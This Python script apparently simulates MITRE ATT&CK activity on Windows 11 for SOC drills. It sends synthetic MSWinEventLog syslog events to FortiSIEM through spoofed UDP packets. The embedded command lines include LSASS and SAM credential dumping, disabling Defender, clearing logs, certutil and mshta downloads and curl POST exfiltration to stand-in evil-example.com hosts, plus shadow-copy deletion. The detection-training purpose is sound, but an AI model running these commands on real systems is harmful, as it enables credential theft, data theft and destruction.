#!/usr/bin/env python3
"""
Windows 11 TTP Simulator -> FortiSIEM via Scapy Syslog

Genera eventos sintéticos Windows 11/Sysmon/PowerShell en formato MSWinEventLog,
alineado con el parser WinSyslogParser que reconoce MSWinEventLog.

Objetivo:
  Simular TTPs MITRE ATT&CK en equipos Windows 11 para ejercicios SOC/FortiSIEM,
  sin ejecutar comandos reales en Windows.

Genera por syslog UDP:
  - Security 4625 / 4624 / 4688
  - PowerShell 4103 / 4104
  - Sysmon 1 / 3 / 7 / 10 / 11 / 12 / 13 / 22
  - System 7045
  - Security 1102

Uso:
  sudo apt update
  sudo apt install -y python3-scapy

  sudo python3 win11_ttp_scapy_fortisiem.py \
    --fortisiem-ip 10.0.0.50 \
    --reporting-ip 10.0.20.105 \
    --hostname MAD-W11-FIN-014 \
    --windows-ip 10.0.10.30 \
    --once \
    --ttps all \
    --count 50

Ejemplos:
  # Solo PowerShell + C2
  sudo python3 win11_ttp_scapy_fortisiem.py --fortisiem-ip 10.0.0.50 --once --ttps powershell c2 --count 20

  # Credenciales + movimiento lateral
  sudo python3 win11_ttp_scapy_fortisiem.py --fortisiem-ip 10.0.0.50 --once --ttps credential_access lateral_movement --count 30

  # Random continuo cada 60s
  sudo python3 win11_ttp_scapy_fortisiem.py --fortisiem-ip 10.0.0.50 --random --count 15 --interval 60

  # Imprimir eventos para Test Parser
  sudo python3 win11_ttp_scapy_fortisiem.py --fortisiem-ip 10.0.0.50 --print-test-events

Notas:
  - No ejecuta ataques reales.
  - Solo envía syslog sintético.
  - Para incidentes, crea reglas en FortiSIEM sobre eventType y/o exercise_id.
"""

from scapy.all import IP, UDP, Raw, send
from datetime import datetime
import argparse
import random
import signal
import time


RUNNING = True

VALID_TTPS = [
    "initial_access",
    "execution",
    "powershell",
    "persistence",
    "privilege_escalation",
    "defense_evasion",
    "credential_access",
    "discovery",
    "lateral_movement",
    "collection",
    "c2",
    "exfiltration",
    "impact",
    "all",
]

TTP_META = {
    "initial_access": ("TA0001", "T1566/T1204", "Phishing / User Execution"),
    "execution": ("TA0002", "T1059/T1218", "Command Execution / Signed Binary Proxy"),
    "powershell": ("TA0002", "T1059.001", "PowerShell"),
    "persistence": ("TA0003", "T1053.005/T1547.001/T1543.003", "Scheduled Task / Run Key / Service"),
    "privilege_escalation": ("TA0004", "T1548", "Abuse Elevation Control Mechanism"),
    "defense_evasion": ("TA0005", "T1070/T1562.001/T1218", "Clear Logs / Disable Tools / LOLBins"),
    "credential_access": ("TA0006", "T1003.001/T1555", "LSASS / Credentials"),
    "discovery": ("TA0007", "T1087/T1046/T1016", "Account / Network Discovery"),
    "lateral_movement": ("TA0008", "T1021.001/T1021.002/WMI", "RDP / SMB / WMI"),
    "collection": ("TA0009", "T1005/T1119", "Local Collection / Automated Collection"),
    "c2": ("TA0011", "T1071.001/T1071.004", "Web / DNS C2"),
    "exfiltration": ("TA0010", "T1041", "Exfiltration Over C2"),
    "impact": ("TA0040", "T1486/T1490", "Encryption / Recovery Inhibition"),
}


WIN11_HOSTS = [
    ("MAD-W11-FIN-014", "10.0.10.30", "corp\\j.garcia", "Finance"),
    ("MAD-W11-HR-022", "10.0.10.31", "corp\\m.rodriguez", "HR"),
    ("MAD-W11-IT-041", "10.0.10.41", "corp\\l.martin", "IT"),
    ("BCN-W11-LEGAL-011", "10.1.10.11", "corp\\c.navarro", "Legal"),
    ("VLC-W11-ENG-020", "10.2.10.20", "corp\\r.torres", "Engineering"),
]

C2_IPS = ["45.83.120.10", "91.199.212.44", "185.203.118.77", "193.56.29.101"]
C2_DOMAINS = [
    "update-checkin-cdn.evil-example.com",
    "api-sync-service.evil-example.com",
    "cdn-telemetry-cache.evil-example.com",
    "edge-service-updater.evil-example.com",
]

SUSPICIOUS_PATHS = [
    r"C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe",
    r"C:\Users\Public\sysupdate.exe",
    r"C:\Windows\Temp\7zS4A1.tmp\setup.exe",
    r"C:\ProgramData\Microsoft\Windows\Caches\msedge_update.exe",
    r"C:\Windows\Tasks\OfficeTelemetryAgent.exe",
    r"C:\Users\j.garcia\AppData\Local\Temp\invoice_2026_04_29.exe",
]

PROCESS_IMAGES = [
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\mshta.exe",
    r"C:\Windows\System32\rundll32.exe",
    r"C:\Windows\System32\regsvr32.exe",
    r"C:\Windows\System32\certutil.exe",
    r"C:\Windows\System32\bitsadmin.exe",
    r"C:\Windows\System32\schtasks.exe",
    r"C:\Windows\System32\wbem\wmic.exe",
    r"C:\Windows\System32\reg.exe",
]


def stop_handler(signum, frame):
    global RUNNING
    RUNNING = False
    print("\n[!] Deteniendo simulador Windows 11 TTP...")


signal.signal(signal.SIGINT, stop_handler)
signal.signal(signal.SIGTERM, stop_handler)


def syslog_ts():
    return datetime.now().strftime("%b %d %H:%M:%S")


def win_time_parts():
    return datetime.now().strftime("%a %b %d %H:%M:%S %Y")


def xml_time():
    return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.0000000Z")


def rand_hex(minv=100000, maxv=0xFFFFFF):
    return f"0x{random.randint(minv, maxv):x}"


def split_domain_user(domain_user):
    if "\\" in domain_user:
        domain, user = domain_user.split("\\", 1)
        return domain, user
    return "CORP", domain_user


def pick_host(args):
    if args.hostname and args.windows_ip:
        domain_user = args.user_full or f"{args.domain}\\{args.user}"
        domain, user = split_domain_user(domain_user)
        return {
            "hostname": args.hostname,
            "ip": args.windows_ip,
            "domain": domain,
            "user": user,
            "user_full": domain_user,
            "group": args.group or "Windows 11 Workstations",
        }

    h, ip, user_full, group = random.choice(WIN11_HOSTS)
    domain, user = split_domain_user(user_full)
    return {"hostname": h, "ip": ip, "domain": domain, "user": user, "user_full": user_full, "group": group}


def send_syslog(args, host, msg_payload):
    raw = f"{args.pri}{syslog_ts()} {host['hostname']} {msg_payload}"
    pkt = (
        IP(src=args.reporting_ip, dst=args.fortisiem_ip)
        / UDP(sport=random.randint(20000, 65000), dport=args.port)
        / Raw(load=raw.encode("utf-8", errors="ignore"))
    )
    send(pkt, verbose=False)


def mswineventlog_payload(os_module, event_id, event_source, account, account_type, action, computer, category, body):
    fields = [
        "MSWinEventLog",
        "1",
        os_module,
        str(random.randint(100000, 999999)),
        win_time_parts(),
        str(event_id),
        event_source,
        account,
        account_type,
        action,
        body,
    ]
    return "\t".join(fields)


def security_event(host, event_id, action, category, body, account=None):
    account = account or host["user"]
    return mswineventlog_payload(
        "Security",
        event_id,
        "Microsoft-Windows-Security-Auditing",
        account,
        "User",
        action,
        host["hostname"],
        category,
        body,
    )


def system_event(host, event_id, source, action, category, body):
    return mswineventlog_payload(
        "System",
        event_id,
        source,
        "N/A",
        "N/A",
        action,
        host["hostname"],
        category,
        body,
    )


def powershell_event(host, event_id, level, category, body):
    return mswineventlog_payload(
        "Microsoft-Windows-PowerShell/Operational",
        event_id,
        "Microsoft-Windows-PowerShell",
        host["user_full"],
        "User",
        level,
        host["hostname"],
        category,
        body,
    )


def sysmon_event(host, event_id, category, body):
    return mswineventlog_payload(
        "Microsoft-Windows-Sysmon/Operational",
        event_id,
        "Microsoft-Windows-Sysmon",
        host["user_full"],
        "User",
        "Information",
        host["hostname"],
        category,
        body,
    )


def body_common(host, ttp):
    tactic, technique, name = TTP_META.get(ttp, ("TA0000", "T0000", "Unknown"))
    return f"exercise_id=SOC-DRILL-WIN11-2026 ttp={ttp} mitre_tactic={tactic} mitre_technique={technique} mitre_name={name} endpoint_group={host['group']}"


def ev_4625_failed_logon(host, attacker_ip):
    failed_user = random.choice(["administrator", "admin", "svc_backup", host["user"]])
    body = (
        "Subject: Security ID: NULL SID Account Name: - Account Domain: - Logon ID: 0x0 "
        "Account For Which Logon Failed: "
        f"Security ID: NULL SID Account Name:  {failed_user} Account Domain:  {host['domain']} "
        "Failure Information: Failure Reason: Unknown user name or bad password Status: 0xC000006D Sub Status: 0xC000006A "
        "Process Information: Caller Process ID: 0x0 Caller Process Name: - "
        f"Network Information: Workstation Name: WIN-REMOTE Source Network Address: {attacker_ip} Source Port:  {random.randint(40000,65000)} "
        "Detailed Authentication Information: Logon Process: NtLmSsp Authentication Package: NTLM Transited Services: - Package Name: - Key Length: 0 "
        + body_common(host, "initial_access")
    )
    return security_event(host, 4625, "Failure Audit", "Logon", body, account="N/A")


def ev_4624_success_logon(host, attacker_ip):
    body = (
        f"Subject: Security ID: SYSTEM Account Name: {host['hostname']}$ Account Domain: {host['domain']} Logon ID: 0x3e7 "
        f"New Logon: Security ID: {host['user_full']} Account Name:  {host['user']} Account Domain:  {host['domain']} "
        f"Logon ID:  {rand_hex()} Logon Type: 3 "
        "Process Information: Process ID:  0x0 Process Name:  - "
        f"Network Information: Workstation Name: WIN-REMOTE Source Network Address: {attacker_ip} Source Port:  {random.randint(40000,65000)} "
        "Detailed Authentication Information: Logon Process:  NtLmSsp Authentication Package: NTLM Transited Services: - Package Name: - Key Length: 0 "
        + body_common(host, "initial_access")
    )
    return security_event(host, 4624, "Success Audit", "Logon", body)


def ev_4688(host, ttp, image, cmdline, parent=r"C:\Windows\explorer.exe"):
    body = (
        "A new process has been created.  "
        "Subject:  "
        f"Security ID: {host['user_full']}  Account Name: {host['user']}  Account Domain: {host['domain']}  Logon ID: {rand_hex()}  "
        "Process Information:  "
        f"New Process ID: {rand_hex(1000,9000)}  New Process Name: {image}  Token Elevation Type: %%1936  "
        f"Creator Process ID: {rand_hex(1000,9000)}  Creator Process Name: {parent}  "
        f"Process Command Line: {cmdline} "
        + body_common(host, ttp)
    )
    return security_event(host, 4688, "Success Audit", "Process Creation", body)


def ev_4103(host, ttp, command):
    body = (
        f"CommandInvocation detected. HostApplication=powershell.exe -NoProfile Command={command} "
        f"User={host['user_full']} "
        + body_common(host, ttp)
    )
    return powershell_event(host, 4103, "Information", "Executing Pipeline", body)


def ev_4104(host, ttp, script):
    body = (
        f"Creating Scriptblock text. ScriptBlockText: {script}. Path: C:\\Users\\Public\\update.ps1 User={host['user_full']} "
        + body_common(host, ttp)
    )
    return powershell_event(host, 4104, "Warning", "Script Block Logging", body)


def ev_sysmon_1(host, ttp, image, command, parent=r"C:\Windows\explorer.exe"):
    body = (
        f"Process Create: RuleName: technique_id={TTP_META[ttp][1]},technique_name={TTP_META[ttp][2]} "
        f"UtcTime: {xml_time()} ProcessGuid: {{{random.randint(100000,999999)}}} ProcessId: {random.randint(1000,9999)} "
        f"Image: {image} CommandLine: {command} CurrentDirectory: C:\\Users\\Public\\ User: {host['user_full']} "
        f"ParentImage: {parent} ParentCommandLine: {parent} "
        + body_common(host, ttp)
    )
    return sysmon_event(host, 1, "Process Create", body)


def ev_sysmon_3(host, ttp, dst_ip=None, dst_domain=None, dst_port=443):
    dst_ip = dst_ip or random.choice(C2_IPS)
    dst_domain = dst_domain or random.choice(C2_DOMAINS)
    image = random.choice([r"C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"])
    body = (
        f"Network connection detected: RuleName: technique_id={TTP_META[ttp][1]},technique_name={TTP_META[ttp][2]} "
        f"UtcTime: {xml_time()} ProcessGuid: {{{random.randint(100000,999999)}}} ProcessId: {random.randint(1000,9999)} "
        f"Image: {image} User: {host['user_full']} Protocol: tcp Initiated: true "
        f"SourceHostname: {host['hostname']} SourceIp: {host['ip']} SourcePort: {random.randint(40000,65000)} "
        f"DestinationHostname: {dst_domain} DestinationIp: {dst_ip} DestinationPort: {dst_port} "
        + body_common(host, ttp)
    )
    return sysmon_event(host, 3, "Network Connection", body)


def ev_sysmon_7(host, ttp):
    dll = random.choice([r"C:\Users\Public\Documents\AdobeSync\helper.dll", r"C:\Windows\Temp\7zS4A1.tmp\plugin.dll"])
    body = (
        f"Image loaded: UtcTime: {xml_time()} ProcessGuid: {{{random.randint(100000,999999)}}} ProcessId: {random.randint(1000,9999)} "
        f"Image: C:\\Windows\\System32\\rundll32.exe ImageLoaded: {dll} Hashes: SHA256={random.getrandbits(256):064x} "
        f"Signed: false SignatureStatus: Unavailable User: {host['user_full']} "
        + body_common(host, ttp)
    )
    return sysmon_event(host, 7, "Image Loaded", body)


def ev_sysmon_10(host, ttp):
    body = (
        f"Process accessed: UtcTime: {xml_time()} SourceProcessGUID: {{{random.randint(100000,999999)}}} "
        f"SourceProcessId: {random.randint(1000,9999)} SourceImage: C:\\Tools\\procdump.exe "
        f"TargetProcessGUID: {{{random.randint(100000,999999)}}} TargetProcessId: 624 TargetImage: C:\\Windows\\System32\\lsass.exe "
        "GrantedAccess: 0x1010 CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d974 "
        f"User: {host['user_full']} "
        + body_common(host, ttp)
    )
    return sysmon_event(host, 10, "Process Access", body)


def ev_sysmon_11(host, ttp, target=None):
    target = target or random.choice(SUSPICIOUS_PATHS)
    body = (
        f"File created: RuleName: technique_id={TTP_META[ttp][1]},technique_name={TTP_META[ttp][2]} "
        f"UtcTime: {xml_time()} ProcessGuid: {{{random.randint(100000,999999)}}} ProcessId: {random.randint(1000,9999)} "
        f"Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TargetFilename: {target} "
        f"CreationUtcTime: {xml_time()} User: {host['user_full']} "
        + body_common(host, ttp)
    )
    return sysmon_event(host, 11, "File Create", body)


def ev_sysmon_12_13(host, ttp):
    event_id = random.choice([12, 13])
    body = (
        f"Registry value set: EventType: SetValue UtcTime: {xml_time()} ProcessGuid: {{{random.randint(100000,999999)}}} "
        f"ProcessId: {random.randint(1000,9999)} Image: C:\\Windows\\System32\\reg.exe "
        r"TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate "
        r"Details: C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe "
        f"User: {host['user_full']} "
        + body_common(host, ttp)
    )
    return sysmon_event(host, event_id, "Registry Event", body)


def ev_sysmon_22(host, ttp, query=None):
    query = query or random.choice(C2_DOMAINS)
    body = (
        f"DNS query: RuleName: technique_id={TTP_META[ttp][1]},technique_name={TTP_META[ttp][2]} "
        f"UtcTime: {xml_time()} ProcessGuid: {{{random.randint(100000,999999)}}} ProcessId: {random.randint(1000,9999)} "
        f"QueryName: {query} QueryStatus: 0 QueryResults: {random.choice(C2_IPS)} "
        r"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "
        f"User: {host['user_full']} "
        + body_common(host, ttp)
    )
    return sysmon_event(host, 22, "DNS Query", body)


def ev_7045_service(host):
    svc = random.choice(["WinUpdateHelper", "OfficeTelemetryAgent", "AdobeSyncSvc"])
    service_file = random.choice(SUSPICIOUS_PATHS)
    body = (
        f"A service was installed in the system. Service Name: {svc} Service File Name: {service_file} "
        "Service Type: user mode service Service Start Type: auto start Service Account: LocalSystem "
        + body_common(host, "persistence")
    )
    return system_event(host, 7045, "Service Control Manager", "Information", "Service Control Manager", body)


def ev_1102(host):
    body = (
        f"The audit log was cleared. Subject: Security ID: {host['user_full']} Account Name: {host['user']} "
        f"Account Domain: {host['domain']} Logon ID: {rand_hex()} "
        + body_common(host, "defense_evasion")
    )
    return security_event(host, 1102, "Success Audit", "Log Clear", body)


# =========================
# TTP GENERATORS
# =========================

def gen_initial_access(host, args):
    return random.choice([
        ev_4625_failed_logon(host, args.attacker_ip),
        ev_4624_success_logon(host, args.attacker_ip),
        ev_sysmon_11(host, "initial_access", random.choice([
            r"C:\Users\j.garcia\Downloads\Factura_042026.scr",
            r"C:\Users\j.garcia\Downloads\DHL_Document_987623.iso",
        ])),
    ])


def gen_execution(host, args):
    cmd = random.choice([
        r"mshta.exe http://edge-service-updater.evil-example.com/update.hta",
        r"regsvr32.exe /s /n /u /i:http://api-sync-service.evil-example.com/scrobj.sct scrobj.dll",
        r"rundll32.exe C:\Users\Public\Documents\AdobeSync\AdobeUpdate.dll,Start",
        r"cmd.exe /c whoami && hostname && ipconfig /all",
    ])
    image = random.choice(PROCESS_IMAGES)
    return random.choice([
        ev_4688(host, "execution", image, cmd),
        ev_sysmon_1(host, "execution", image, cmd),
        ev_sysmon_7(host, "execution"),
    ])


def gen_powershell(host, args):
    command = random.choice([
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Write-Output PS ATTACK!!!",
        "powershell.exe -NoProfile -EncodedCommand <redacted>",
        "Invoke-WebRequest -Uri http://update-checkin-cdn.evil-example.com/a.dat -OutFile C:\\Users\\Public\\a.dat",
    ])
    return random.choice([
        ev_4103(host, "powershell", command),
        ev_4104(host, "powershell", command),
        ev_4688(host, "powershell", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", command),
        ev_sysmon_1(host, "powershell", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", command),
    ])


def gen_persistence(host, args):
    cmd = random.choice([
        r"schtasks.exe /Create /TN OfficeTelemetryAgent /SC MINUTE /MO 30 /TR C:\Windows\Tasks\OfficeTelemetryAgent.exe",
        r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe /f",
        r"sc.exe create WinUpdateHelper binPath= C:\ProgramData\Microsoft\Windows\Caches\msedge_update.exe start= auto",
    ])
    return random.choice([
        ev_4688(host, "persistence", random.choice(PROCESS_IMAGES), cmd),
        ev_sysmon_12_13(host, "persistence"),
        ev_7045_service(host),
    ])


def gen_privilege_escalation(host, args):
    cmd = random.choice([
        "powershell.exe Start-Process cmd.exe -Verb runAs",
        "whoami /priv",
        "net localgroup administrators corp\\temp.user /add",
    ])
    return random.choice([
        ev_4688(host, "privilege_escalation", random.choice(PROCESS_IMAGES), cmd),
        ev_sysmon_1(host, "privilege_escalation", random.choice(PROCESS_IMAGES), cmd),
    ])


def gen_defense_evasion(host, args):
    cmd = random.choice([
        "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
        "wevtutil cl Security",
        r"certutil.exe -urlcache -split -f http://cdn-telemetry-cache.evil-example.com/file.dat C:\Windows\Temp\a.dat",
    ])
    return random.choice([
        ev_4688(host, "defense_evasion", random.choice(PROCESS_IMAGES), cmd),
        ev_1102(host),
        ev_sysmon_1(host, "defense_evasion", random.choice(PROCESS_IMAGES), cmd),
    ])


def gen_credential_access(host, args):
    cmd = random.choice([
        r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full",
        r"procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp",
        r"reg.exe save HKLM\SAM C:\Windows\Temp\sam.save",
    ])
    return random.choice([
        ev_4688(host, "credential_access", random.choice(PROCESS_IMAGES), cmd),
        ev_sysmon_10(host, "credential_access"),
    ])


def gen_discovery(host, args):
    cmd = random.choice([
        "whoami /all",
        "net user /domain",
        "nltest /dclist:corp.local",
        "net view /domain",
        "ipconfig /all",
        "arp -a",
    ])
    return random.choice([
        ev_4688(host, "discovery", random.choice(PROCESS_IMAGES), cmd),
        ev_sysmon_1(host, "discovery", random.choice(PROCESS_IMAGES), cmd),
    ])


def gen_lateral_movement(host, args):
    dst_ip = random.choice(["10.0.20.10", "10.0.20.50", "10.1.20.25"])
    cmd = random.choice([
        f"mstsc.exe /v:{dst_ip}",
        f"net use \\\\{dst_ip}\\C$ /user:corp\\svc_backup",
        f"wmic /node:{dst_ip} process call create cmd.exe",
    ])
    return random.choice([
        ev_4688(host, "lateral_movement", random.choice(PROCESS_IMAGES), cmd),
        ev_sysmon_3(host, "lateral_movement", dst_ip=dst_ip, dst_domain=f"host-{dst_ip.replace('.', '-')}.corp.local", dst_port=random.choice([445, 3389, 5985])),
    ])


def gen_collection(host, args):
    cmd = random.choice([
        r"powershell.exe Compress-Archive -Path C:\Shares\Finance\*.xlsx -DestinationPath C:\Windows\Temp\finance.zip",
        r"cmd.exe /c dir /s C:\Users\*.xlsx",
        r"robocopy C:\Shares\Finance C:\Windows\Temp\stage /E",
    ])
    return random.choice([
        ev_4688(host, "collection", random.choice(PROCESS_IMAGES), cmd),
        ev_sysmon_11(host, "collection", r"C:\Windows\Temp\finance.zip"),
    ])


def gen_c2(host, args):
    return random.choice([
        ev_sysmon_3(host, "c2"),
        ev_sysmon_22(host, "c2"),
    ])


def gen_exfiltration(host, args):
    dst = random.choice(C2_DOMAINS)
    cmd = random.choice([
        f"powershell.exe Invoke-WebRequest -Method POST -Uri https://{dst}/upload -InFile C:\\Windows\\Temp\\finance.zip",
        f"curl.exe -k -X POST https://{dst}/upload --data-binary @C:\\Windows\\Temp\\finance.zip",
        "rclone.exe copy C:\\Windows\\Temp\\stage remote:backup",
    ])
    return random.choice([
        ev_4688(host, "exfiltration", random.choice(PROCESS_IMAGES), cmd),
        ev_sysmon_3(host, "exfiltration", dst_domain=dst, dst_port=443),
    ])


def gen_impact(host, args):
    cmd = random.choice([
        "vssadmin.exe Delete Shadows /All /Quiet",
        "wbadmin.exe delete catalog -quiet",
        "powershell.exe Get-ChildItem C:\\Shares -Recurse | Rename-Item -NewName {$_.Name + '.locked'}",
    ])
    return random.choice([
        ev_4688(host, "impact", random.choice(PROCESS_IMAGES), cmd),
        ev_sysmon_11(host, "impact", random.choice([
            r"D:\Data\HR\employees.xlsx.locked",
            r"E:\Shares\Legal\contracts.docx.encrypted",
        ])),
    ])


GEN_BY_TTP = {
    "initial_access": gen_initial_access,
    "execution": gen_execution,
    "powershell": gen_powershell,
    "persistence": gen_persistence,
    "privilege_escalation": gen_privilege_escalation,
    "defense_evasion": gen_defense_evasion,
    "credential_access": gen_credential_access,
    "discovery": gen_discovery,
    "lateral_movement": gen_lateral_movement,
    "collection": gen_collection,
    "c2": gen_c2,
    "exfiltration": gen_exfiltration,
    "impact": gen_impact,
}


def expand_ttps(ttps):
    if not ttps or "all" in ttps:
        return [t for t in VALID_TTPS if t != "all"]
    return ttps


def send_round(args):
    ttps = expand_ttps(args.ttps)
    print(f"\n[+] Ronda Windows 11 TTP: count={args.count}, ttps={','.join(ttps)}")

    for i in range(args.count):
        host = pick_host(args)
        ttp = random.choice([t for t in VALID_TTPS if t != "all"]) if args.random else random.choice(ttps)
        event = GEN_BY_TTP[ttp](host, args)
        send_syslog(args, host, event)
        print(f"    OK {i+1:03d}/{args.count} host={host['hostname']:18} ip={host['ip']:15} ttp={ttp}")
        time.sleep(random.uniform(args.min_delay, args.max_delay))


def print_test_events(args):
    host = pick_host(args)
    print("4625:")
    print(f"{args.pri}{syslog_ts()} {host['hostname']} {ev_4625_failed_logon(host, args.attacker_ip)}")
    print("\n4688:")
    print(f"{args.pri}{syslog_ts()} {host['hostname']} {ev_4688(host, 'execution', r'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'powershell.exe -NoProfile -EncodedCommand <redacted>')}")
    print("\nSysmon 3:")
    print(f"{args.pri}{syslog_ts()} {host['hostname']} {ev_sysmon_3(host, 'c2')}")


def parse_args():
    p = argparse.ArgumentParser(description="Windows 11 TTP simulator for FortiSIEM via Scapy")
    p.add_argument("--fortisiem-ip", required=True)
    p.add_argument("--port", type=int, default=514)
    p.add_argument("--reporting-ip", default="10.0.20.105")
    p.add_argument("--hostname", help="Hostname Windows 11 concreto. Si no se indica, usa hosts aleatorios internos.")
    p.add_argument("--windows-ip", help="IP Windows 11 concreta. Si no se indica, usa hosts aleatorios internos.")
    p.add_argument("--domain", default="CORP")
    p.add_argument("--user", default="j.garcia")
    p.add_argument("--user-full", help=r"Usuario completo, por ejemplo corp\j.garcia")
    p.add_argument("--group", help="Grupo del endpoint")
    p.add_argument("--attacker-ip", default="185.231.88.45")
    p.add_argument("--ttps", nargs="+", default=["all"], choices=VALID_TTPS)
    p.add_argument("--random", action="store_true", help="Ignora --ttps y elige TTP aleatoria por evento")
    p.add_argument("--count", type=int, default=25)
    p.add_argument("--interval", type=int, default=60)
    p.add_argument("--loop", action="store_true")
    p.add_argument("--once", action="store_true")
    p.add_argument("--pri", default="<134>")
    p.add_argument("--min-delay", type=float, default=0.2)
    p.add_argument("--max-delay", type=float, default=0.8)
    p.add_argument("--print-test-events", action="store_true")
    p.add_argument("--list-ttps", action="store_true")
    return p.parse_args()


def main():
    args = parse_args()

    if args.list_ttps:
        print("TTPs disponibles:")
        for t in VALID_TTPS:
            if t == "all":
                continue
            print(f"  {t:22} {TTP_META[t][0]:8} {TTP_META[t][1]:20} {TTP_META[t][2]}")
        return

    print("[+] Windows 11 TTP Simulator -> FortiSIEM")
    print(f"[+] FortiSIEM: {args.fortisiem_ip}:{args.port}/UDP")
    print(f"[+] Reporting IP spoofeada: {args.reporting_ip}")
    print("[+] Formato: MSWinEventLog alineado con WinSyslogParser")
    print("[+] Busca: SOC-DRILL-WIN11-2026, Win-Security-4625, Win-Security-4688, Win-Sysmon-3")

    if args.print_test_events:
        print_test_events(args)
        return

    if not args.loop:
        send_round(args)
        print("[+] Finalizado.")
        return

    while RUNNING:
        send_round(args)
        print(f"[+] Próxima ronda en {args.interval} segundos")
        for _ in range(args.interval):
            if not RUNNING:
                break
            time.sleep(1)

    print("[+] Simulador detenido.")


if __name__ == "__main__":
    main()

